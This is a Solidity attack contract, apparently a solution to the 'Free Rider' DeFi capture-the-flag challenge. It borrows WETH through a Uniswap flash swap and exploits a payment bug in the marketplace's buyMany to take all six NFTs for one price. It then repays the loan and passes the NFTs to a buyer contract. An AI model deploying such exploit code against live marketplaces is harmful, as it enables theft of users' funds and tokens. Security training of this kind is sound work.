// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "./FreeRiderBuyer.sol";

interface UniswapV2Pair is IERC721Receiver{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

contract FreeRiderAttacker is IUniswapV2Callee {

    UniswapV2Pair private uniswapPair;
    FreeRiderNFTMarketplace private marketPlace;
    IWETH9 private weth;
    ERC721 public nft;
    FreeRiderBuyer public buyer;
    uint256[] private ids = [0, 1, 2, 3, 4, 5];

    constructor(address _uniswapPairAddress,
        address payable _marketPlace,
        address _wethAddress,
        address _nftAddress,
        address _buyer
    ) {
        uniswapPair = UniswapV2Pair(_uniswapPairAddress);
        marketPlace = FreeRiderNFTMarketplace(_marketPlace);
        weth = IWETH9(_wethAddress);
        nft = ERC721(_nftAddress);
        buyer = FreeRiderBuyer(_buyer);
    }

    // send the 0.5 eth for interest
    function getFlashSwap(uint256 amount) external payable{
        //get a flash swap (loan)
        uniswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // exchange the loaned weth to eth
        weth.withdraw(amount0);
        // buy all nft with a single 15eth loan, because of the bug in the marketplace contract
        marketPlace.buyMany{value: address(this).balance}(ids);
        // exchange back the 15 eth to weth
        weth.deposit{value: address(this).balance}();
        // pay back the flashswap + interest
        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
        //approve all nfts for buyer
        nft.setApprovalForAll(address(buyer), true);
                require(
                nft.isApprovedForAll(address(this), address(buyer)),
                    "Not All approved for buyer!"
                );
        //transfer them to buyer
        nft.safeTransferFrom(address(this), address(buyer), 0);
        nft.safeTransferFrom(address(this), address(buyer), 1);
        nft.safeTransferFrom(address(this), address(buyer), 2);
        nft.safeTransferFrom(address(this), address(buyer), 3);
        nft.safeTransferFrom(address(this), address(buyer), 4);
        nft.safeTransferFrom(address(this), address(buyer), 5);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
